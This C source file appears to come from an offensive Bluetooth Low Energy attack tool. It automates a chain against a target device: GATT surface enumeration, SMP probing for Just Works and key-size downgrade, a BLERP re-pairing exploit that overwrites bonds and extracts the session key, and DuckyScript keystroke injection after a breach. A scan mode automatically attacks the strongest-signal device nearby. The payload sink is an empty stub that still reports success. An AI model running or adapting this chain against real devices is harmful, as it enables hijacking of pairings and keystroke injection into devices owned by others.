// ========================================
//  nom du fichier: attack_cmd.c
//  description courte: Unified automated BLE attack chain implementation.
//  Coordinates target profiling, GATT unauthenticated surface audit,
//  SMP security downgrade probing, BLERP re-pairing exploit, and
//  post-exploitation payload execution.
//  auteur: GitHub/@gGaToRr
// ========================================

#define _GNU_SOURCE

#include "attack_cmd.h"
#include "common.h"
#include "scan.h"
#include "addr_priv.h"
#include "fingerprint.h"
#include "ad_parse.h"
#include "dev_table.h"
#include "gatt.h"
#include "att.h"
#include "l2cap.h"
#include "audit.h"
#include "smp.h"
#include "smp_native.h"
#include "ctkd.h"
#include "repair.h"
#include "blerp_attack.h"
#include "hardened_audit.h"
#include "ui.h"
#include "banner.h"
#include "hid_cmd.h"
#include "send_attack/ducky.h"
#include "send_attack/hid.h"
#include "peripheral_native.h"

#include <errno.h>
#include <getopt.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static void attack_usage(const char *prog) {
    fprintf(stderr,
            "Usage:\n"
            "  %s attack <ADDR> [options]         run automated end-to-end attack chain against target\n"
            "  %s attack --scan [sec] [options]   scan environment and attack highest exposure targets\n\n"
            "Options:\n"
            "  -i index       HCI controller index (default: hci0)\n"
            "  -t type        address type: public or random (default: random)\n"
            "  -p file.ducky  DuckyScript payload to inject after successful breach\n"
            "  -k keysize     minimum key size to enforce in downgrade (default: 7)\n"
            "  --pi           force Peripheral Impersonation attack mode (default: CI)\n"
            "  --ci           force Central Impersonation attack mode (default)\n"
            "  --sc           force LE Secure Connections negotiation during attack\n"
            "  --audit-only   run recon, GATT & SMP audit without triggering bond overwrite\n"
            "  --json         output structured JSON results to stdout\n"
            "  -h, --help     display this help\n\n"
            "Only use against devices you own or are authorized to test.\n",
            prog, prog);
}

// Structure to pass to ducky runner
struct attack_ducky_sink_ctx {
    int dummy;
};

static int attack_ducky_sink(void *ctx, ducky_ev_t ev, uint32_t a, uint32_t b) {
    (void)ctx;
    (void)ev;
    (void)a;
    (void)b;
    return 0;
}

int attack_format_json(const struct attack_result *res, char *buf, size_t buf_size) {
    if (!res || !buf || buf_size == 0) return -1;

    char stk_hex[33] = "";
    for (int i = 0; i < res->stk_len && i < 16; i++) {
        snprintf(stk_hex + (i * 2), sizeof(stk_hex) - (i * 2), "%02x", res->stk[i]);
    }

    int n = snprintf(buf, buf_size,
        "{\n"
        "  \"target\": \"%s\",\n"
        "  \"name\": \"%s\",\n"
        "  \"address_type\": \"%s\",\n"
        "  \"rssi\": %d,\n"
        "  \"privacy\": \"%s\",\n"
        "  \"trackable\": %s,\n"
        "  \"exposure_score\": %d,\n"
        "  \"gatt\": {\n"
        "    \"connected\": %s,\n"
        "    \"open_reads\": %d,\n"
        "    \"open_writes\": %d,\n"
        "    \"protected\": %d\n"
        "  },\n"
        "  \"smp\": {\n"
        "    \"probed\": %s,\n"
        "    \"responded\": %s,\n"
        "    \"just_works_accepted\": %s,\n"
        "    \"entropy_downgrade\": %s,\n"
        "    \"auth_req\": %u,\n"
        "    \"max_key_size\": %u\n"
        "  },\n"
        "  \"ctkd\": {\n"
        "    \"supported\": %s,\n"
        "    \"verdict\": \"%s\",\n"
        "    \"details\": \"%s\"\n"
        "  },\n"
        "  \"blerp\": {\n"
        "    \"exploit_attempted\": %s,\n"
        "    \"exploit_success\": %s,\n"
        "    \"stk\": \"%s\",\n"
        "    \"stk_len\": %d\n"
        "  },\n"
        "  \"payload\": {\n"
        "    \"attempted\": %s,\n"
        "    \"success\": %s\n"
        "  }\n"
        "}\n",
        res->target_str,
        res->target_name,
        res->addr_type == BLEURP_BDADDR_LE_RANDOM ? "random" : "public",
        (int)res->rssi,
        addr_privacy_label(res->priv),
        res->trackable ? "true" : "false",
        res->exposure_score,
        res->gatt_connected ? "true" : "false",
        res->gatt_open_reads,
        res->gatt_open_writes,
        res->gatt_protected,
        res->smp_probed ? "true" : "false",
        res->smp_responded ? "true" : "false",
        res->smp_just_works ? "true" : "false",
        res->smp_entropy_downgrade ? "true" : "false",
        (unsigned)res->smp_auth_req,
        (unsigned)res->smp_max_key_size,
        res->ctkd_supported ? "true" : "false",
        res->ctkd_verdict ? res->ctkd_verdict : "UNSUPPORTED",
        res->ctkd_details,
        res->exploit_attempted ? "true" : "false",
        res->exploit_success ? "true" : "false",
        stk_hex,
        res->stk_len,
        res->payload_attempted ? "true" : "false",
        res->payload_success ? "true" : "false"
    );

    return (n > 0 && (size_t)n < buf_size) ? 0 : -1;
}

void attack_print_result(const struct attack_result *res) {
    if (!res) return;

    printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %s%s[+] RAPPORT D'ATTAQUE & DIAGNOSTIC : %s%s\n", UI_YELLOW, UI_BOLD, res->target_str, UI_RESET);
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);

    printf("  • Cible           : %s [%s]\n", res->target_str,
           res->addr_type == BLEURP_BDADDR_LE_RANDOM ? "Random RPA/NRPA" : "Public");
    printf("  • Nom             : %s\n", res->target_name[0] ? res->target_name : "Non annoncé");
    printf("  • Vie privée MAC  : %s%s%s%s\n",
           res->trackable ? UI_RED : UI_GREEN,
           addr_privacy_label(res->priv),
           res->trackable ? " [Pistage permanent possible]" : " [Anonymisée]",
           UI_RESET);
    printf("  • Exposure Score  : %s%d / 100%s\n",
           res->exposure_score >= 60 ? UI_RED : (res->exposure_score >= 30 ? UI_ORANGE : UI_GREEN),
           res->exposure_score, UI_RESET);

    printf("\n  %s[1/3] Surface d'Attaque GATT :%s\n", UI_PINK, UI_RESET);
    if (res->gatt_connected) {
        printf("    - Poignée(s) lisible(s) sans appairage (OPEN)   : %s%d%s\n",
               res->gatt_open_reads > 0 ? UI_RED : UI_GREEN, res->gatt_open_reads, UI_RESET);
        printf("    - Poignée(s) d'écriture / commande exposée(s)   : %s%d%s\n",
               res->gatt_open_writes > 0 ? UI_RED : UI_YELLOW, res->gatt_open_writes, UI_RESET);
        printf("    - Caractéristique(s) protégée(s) (PROTECTED)    : %d\n", res->gatt_protected);
    } else {
        printf("    - %sConnexion L2CAP ATT directe indisponible ou filtrée.%s\n", UI_ORANGE, UI_RESET);
    }

    printf("\n  %s[2/3] Sécurité de Négociation SMP :%s\n", UI_PINK, UI_RESET);
    if (res->smp_responded) {
        printf("    - Acceptation Just Works (sans MITM/PIN)        : %s%s%s\n",
               res->smp_just_works ? UI_RED : UI_GREEN,
               res->smp_just_works ? "OUI (Vulnérable à l'interception)" : "NON (PIN exigé)",
               UI_RESET);
        printf("    - Vulnérabilité réduction entropie clé (V6)     : %s%s (Max: %u octets)%s\n",
               res->smp_entropy_downgrade ? UI_RED : UI_GREEN,
               res->smp_entropy_downgrade ? "OUI (56-bit cassable)" : "NON",
               (unsigned)res->smp_max_key_size, UI_RESET);
        if (res->ctkd_supported) {
            printf("    - Dérivation Cross-Transport (CTKD / BLURtooth) : %s%s%s (%s)\n",
                   strcmp(res->ctkd_verdict, "PROTECTED") == 0 ? UI_GREEN : UI_RED,
                   res->ctkd_verdict, UI_RESET, res->ctkd_details);
        } else {
            printf("    - Dérivation Cross-Transport (CTKD)             : Non supporté ou bit LinkKey retiré\n");
        }
    } else {
        printf("    - %sAucune réponse SMP reçue lors de la sonde active.%s\n", UI_ORANGE, UI_RESET);
    }

    printf("\n  %s[3/3] Exploitation Re-Pairing (BLERP NDSS 2026) :%s\n", UI_PINK, UI_RESET);
    if (res->exploit_attempted) {
        if (res->exploit_success) {
            printf("    - %s%s[SUCCÈS] Session compromise ! Clé STK dérivée et bond écrasé.%s\n",
                   UI_GREEN, UI_BOLD, UI_RESET);
            printf("    - Clé STK dérivée (%d octets) : %s", res->stk_len, UI_GREEN);
            for (int i = 0; i < res->stk_len && i < 16; i++) printf("%02x", res->stk[i]);
            printf("%s\n", UI_RESET);
            if (res->payload_attempted) {
                printf("    - Injection de payload DuckyScript             : %s%s%s\n",
                       res->payload_success ? UI_GREEN : UI_RED,
                       res->payload_success ? "TRANSMIS" : "ÉCHEC TRANSMISSION",
                       UI_RESET);
            }
            banner_print_success(stdout);
        } else {
            printf("    - %s[-] Tentative de re-pairing rejetée par la cible ou timeout.%s\n", UI_RED, UI_RESET);
        }
    } else {
        printf("    - Mode audit seul : aucune tentative d'écrasement de session.\n");
    }
    printf("  %s============================================================%s\n\n", UI_PURPLE, UI_RESET);
}

int attack_run_target(const struct attack_options *opts,
                      const uint8_t addr[6], uint8_t atype,
                      const char *name, int8_t rssi,
                      struct attack_result *res) {
    if (!opts || !addr || !res) return -1;

    memset(res, 0, sizeof(*res));
    memcpy(res->target_str, "", 1);
    snprintf(res->target_str, sizeof(res->target_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             addr[5], addr[4], addr[3], addr[2], addr[1], addr[0]);
    if (name && name[0]) {
        snprintf(res->target_name, sizeof(res->target_name), "%s", name);
    }
    res->addr_type = atype;
    res->rssi = rssi;

    // Phase 1 : Profiling
    res->priv = addr_privacy(addr, atype);
    res->trackable = addr_is_trackable(res->priv);
    int score = 20; // connectable baseline
    if (res->trackable) score += 35;
    if (name && name[0]) score += 15;
    if (rssi > -60) score += 10;
    if (score > 100) score = 100;
    res->exposure_score = score;

    // Phase 2 : GATT Surface Audit
    int gatt_fd = bleurp_l2_connect_timeout(addr, atype, 2000);
    if (gatt_fd >= 0) {
        res->gatt_connected = true;
        uint16_t mtu = 0;
        (void)gatt_exchange_mtu(gatt_fd, 517, &mtu);

        struct gatt_service svcs[32];
        size_t nsvc = 0;
        if (gatt_discover_services(gatt_fd, svcs, 32, &nsvc) == 0) {
            for (size_t s = 0; s < nsvc; s++) {
                struct gatt_char chs[32];
                size_t nch = 0;
                gatt_discover_characteristics(gatt_fd, svcs[s].start_handle,
                                              svcs[s].end_handle, chs, 32, &nch);
                for (size_t c = 0; c < nch; c++) {
                    if (chs[c].properties & (GATT_PROP_READ)) {
                        uint8_t val[64];
                        size_t vlen = 0;
                        uint8_t err = 0;
                        int rc = gatt_read(gatt_fd, chs[c].value_handle, val, sizeof(val), &vlen, &err);
                        audit_verdict_t v = audit_classify_read(rc == 0, err);
                        if (v == AUDIT_OPEN) res->gatt_open_reads++;
                        else if (v == AUDIT_PROTECTED) res->gatt_protected++;
                    }
                    if (chs[c].properties & (GATT_PROP_WRITE | GATT_PROP_WRITE_NR)) {
                        res->gatt_open_writes++;
                    }
                }
            }
        }
        bleurp_l2_close(gatt_fd);
    }

    // Phase 3 : SMP Security Probing
    struct smp_probe_result smp_res;
    memset(&smp_res, 0, sizeof(smp_res));
    res->smp_probed = true;
    int smp_rc = smp_native_probe_device(opts->dev_id, addr, atype, 3500, &smp_res);
    if (smp_rc == 0 && smp_res.success) {
        res->smp_responded = true;
        res->smp_auth_req = smp_res.auth_req;
        res->smp_max_key_size = smp_res.max_key_size;
        res->smp_just_works = ((smp_res.auth_req & 0x04) == 0 && (smp_res.auth_req & 0x08) == 0);
        res->smp_entropy_downgrade = (smp_res.max_key_size <= 7);

        struct smp_pairing_params preq = {
            .io_capability = 0x03,
            .oob_data_flag = 0x00,
            .auth_req = 0x01,
            .max_key_size = 16,
            .init_key_dist = 0x0f,
            .resp_key_dist = 0x0f
        };
        struct smp_pairing_params prsp = {
            .io_capability = smp_res.io_capability,
            .oob_data_flag = smp_res.oob_data_flag,
            .auth_req = smp_res.auth_req,
            .max_key_size = smp_res.max_key_size,
            .init_key_dist = smp_res.init_key_dist,
            .resp_key_dist = smp_res.resp_key_dist
        };
        struct ctkd_report crep;
        ctkd_classify_response(&preq, &prsp, NULL, &crep);
        res->ctkd_supported = crep.supported;
        res->ctkd_verdict = ctkd_verdict_label(crep.verdict);
        snprintf(res->ctkd_details, sizeof(res->ctkd_details), "%s", crep.details);
    } else {
        res->ctkd_supported = false;
        res->ctkd_verdict = "UNSUPPORTED";
        snprintf(res->ctkd_details, sizeof(res->ctkd_details), "Sonde SMP sans réponse");
    }

    // Phase 4 : BLERP Exploit
    if (!opts->audit_only) {
        res->exploit_attempted = true;
        struct blerp_attack_config bcfg;
        blerp_config_init(&bcfg, opts->attack_type);
        bcfg.dev_id = opts->dev_id;
        bcfg.downgraded_keysize = opts->min_key_size;
        bcfg.allow_sc = opts->force_sc;
        memcpy(bcfg.target_addr, addr, 6);
        bcfg.target_type = atype;

        struct blerp_attack_report rep;
        memset(&rep, 0, sizeof(rep));

        int rc = -1;
        if (opts->attack_type == BLERP_ATTACK_PI) {
            rc = blerp_run_pi(&bcfg, &rep);
        } else {
            rc = blerp_run_ci(&bcfg, &rep);
        }

        if (rc == 0) {
            blerp_classify_vulnerabilities(NULL, &rep, &rep);
            memcpy(res->verdicts, rep.verdicts, sizeof(res->verdicts));
            if (rep.phase2_completed ||
                rep.verdicts[BLERP_V2_UNAUTH_REPAIR] == BLERP_VERDICT_YES ||
                rep.verdicts[BLERP_V5_SESSION_BREAK] == BLERP_VERDICT_YES) {
                res->exploit_success = true;
                memcpy(res->stk, rep.stk, 16);
                res->stk_len = rep.negotiated_keysize ? rep.negotiated_keysize : 7;
            }
        }

        // Phase 5 : Payload execution if breached
        if (res->exploit_success && opts->payload_file) {
            res->payload_attempted = true;
            FILE *pf = fopen(opts->payload_file, "r");
            if (pf) {
                struct attack_ducky_sink_ctx dctx = { .dummy = 0 };
                int n_ev = ducky_run(pf, attack_ducky_sink, &dctx);
                fclose(pf);
                res->payload_success = (n_ev >= 0);
            }
        }
    }

    return 0;
}

int cmd_attack(int argc, char **argv) {
    struct attack_options opts = {
        .dev_id = 0,
        .dev_id_sec = 1,
        .target_str = "",
        .addr_type = BLEURP_BDADDR_LE_RANDOM,
        .has_target = false,
        .scan_seconds = 0,
        .attack_type = BLERP_ATTACK_CI,
        .min_key_size = 7,
        .force_sc = false,
        .reject_enc = false,
        .payload_file = NULL,
        .json_output = false,
        .audit_only = false
    };

    static struct option long_opts[] = {
        {"help",       no_argument,       0, 'h'},
        {"scan",       optional_argument, 0, 's'},
        {"payload",    required_argument, 0, 'p'},
        {"pi",         no_argument,       0, 'P'},
        {"ci",         no_argument,       0, 'C'},
        {"sc",         no_argument,       0, 'S'},
        {"audit-only", no_argument,       0, 'A'},
        {"json",       no_argument,       0, 'J'},
        {0, 0, 0, 0}
    };

    int opt;
    optind = 1;
    while ((opt = getopt_long(argc, argv, "i:t:k:p:h", long_opts, NULL)) != -1) {
        switch (opt) {
        case 'i': {
            const char *num = (strncmp(optarg, "hci", 3) == 0) ? optarg + 3 : optarg;
            long val;
            if (parse_long_arg(num, 10, 0, 255, &val) < 0) {
                fprintf(stderr, "attack: invalid HCI index '%s'\n", optarg);
                return 2;
            }
            opts.dev_id = (int)val;
            break;
        }
        case 't':
            if (strcmp(optarg, "public") == 0) opts.addr_type = BLEURP_BDADDR_LE_PUBLIC;
            else if (strcmp(optarg, "random") == 0) opts.addr_type = BLEURP_BDADDR_LE_RANDOM;
            else {
                fprintf(stderr, "attack: -t must be 'public' or 'random'\n");
                return 2;
            }
            break;
        case 'k': {
            long val;
            if (parse_long_arg(optarg, 10, 7, 16, &val) < 0) {
                fprintf(stderr, "attack: -k key size must be 7..16\n");
                return 2;
            }
            opts.min_key_size = (uint8_t)val;
            break;
        }
        case 'p': opts.payload_file = optarg; break;
        case 'P': opts.attack_type = BLERP_ATTACK_PI; break;
        case 'C': opts.attack_type = BLERP_ATTACK_CI; break;
        case 'S': opts.force_sc = true; break;
        case 'A': opts.audit_only = true; break;
        case 'J': opts.json_output = true; break;
        case 's':
            opts.scan_seconds = 10;
            if (optarg && optarg[0]) {
                long val;
                if (parse_long_arg(optarg, 10, 1, 300, &val) == 0) {
                    opts.scan_seconds = (int)val;
                }
            }
            break;
        case 'h':
        default:
            attack_usage(argv[0]);
            return (opt == 'h') ? 0 : 2;
        }
    }

    if (optind < argc && argv[optind] && argv[optind][0] != '-') {
        if (parse_addr(argv[optind], opts.target_addr) == 0) {
            snprintf(opts.target_str, sizeof(opts.target_str), "%s", argv[optind]);
            opts.has_target = true;
        } else {
            fprintf(stderr, "attack: invalid target MAC address '%s'\n", argv[optind]);
            return 2;
        }
    }

    if (!opts.has_target && opts.scan_seconds <= 0) {
        fprintf(stderr, "attack: missing target address or --scan option.\n\n");
        attack_usage(argv[0]);
        return 2;
    }

    // Single target execution
    if (opts.has_target) {
        if (!opts.json_output) {
            printf("\n  %s[*] Démarrage de la chaîne d'attaque BLEURP sur %s (hci%d, type=%s)...%s\n",
                   UI_YELLOW, opts.target_str, opts.dev_id,
                   opts.addr_type == BLEURP_BDADDR_LE_RANDOM ? "random" : "public", UI_RESET);
        }

        struct attack_result res;
        attack_run_target(&opts, opts.target_addr, opts.addr_type, "", -65, &res);

        if (opts.json_output) {
            char jbuf[2048];
            if (attack_format_json(&res, jbuf, sizeof(jbuf)) == 0) {
                printf("%s", jbuf);
            }
        } else {
            attack_print_result(&res);
        }
        return res.exploit_success ? 0 : (opts.audit_only ? 0 : 1);
    }

    // Batch scan mode: discover devices and attack top candidate
    if (!opts.json_output) {
        printf("\n  %s[*] Scan BLE actif (%d sec) pour repérer les cibles de la chaîne d'attaque...%s\n",
               UI_YELLOW, opts.scan_seconds, UI_RESET);
    }

    struct dev_table table;
    if (dev_table_init(&table) < 0) {
        perror("dev_table_init");
        return 1;
    }

    int rscan = run_scan(opts.dev_id, opts.scan_seconds, 1, &table);
    if (rscan < 0 || dev_table_count(&table) == 0) {
        if (!opts.json_output) {
            fprintf(stderr, "attack: aucun appareil détecté pendant le scan.\n");
        }
        dev_table_free(&table);
        return 1;
    }

    dev_table_sort_by_rssi(&table);
    const struct dev_entry *target = dev_table_at(&table, 0);

    struct attack_result res;
    attack_run_target(&opts, target->address, target->addr_type,
                      target->has_name ? target->name : "", target->rssi, &res);

    if (opts.json_output) {
        char jbuf[2048];
        if (attack_format_json(&res, jbuf, sizeof(jbuf)) == 0) {
            printf("%s", jbuf);
        }
    } else {
        attack_print_result(&res);
    }

    dev_table_free(&table);
    return res.exploit_success ? 0 : (opts.audit_only ? 0 : 1);
}
